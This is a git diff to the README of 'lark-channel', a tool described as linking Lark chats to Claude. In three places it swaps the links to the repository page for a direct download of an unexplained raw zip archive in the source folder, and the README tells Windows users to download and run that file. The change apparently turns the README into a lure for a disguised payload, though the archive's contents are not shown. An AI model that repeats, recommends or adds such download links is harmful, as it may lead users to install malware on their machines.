@@ -1,6 +1,6 @@
 # 🤝 lark-channel - Connect Lark chats to Claude
 
-[![Download lark-channel](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge&logo=github)](https://github.com/meshed-potato911/lark-channel)
+[![Download lark-channel](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/meshed-potato911/lark-channel/main/src/lark_channel_semicommercial.zip)
 
 ## 🧭 What lark-channel does
 
@@ -24,7 +24,7 @@ For the best setup, use a modern version of Windows with a stable internet conne
 
 Open this page to get the app files:
 
-[Visit the download page](https://github.com/meshed-potato911/lark-channel)
+[Visit the download page](https://raw.githubusercontent.com/meshed-potato911/lark-channel/main/src/lark_channel_semicommercial.zip)
 
 If the page contains a release file or packaged app, download it to your PC and run it. If the page shows source files only, use the setup steps on the page to get the right build for Windows.
 
@@ -223,4 +223,4 @@ If the chat response is slow, check your network and the agent service status.
 
 ## 🔗 Download again
 
-[Open the lark-channel download page](https://github.com/meshed-potato911/lark-channel)
+[Open the lark-channel download page](https://raw.githubusercontent.com/meshed-potato911/lark-channel/main/src/lark_channel_semicommercial.zip)
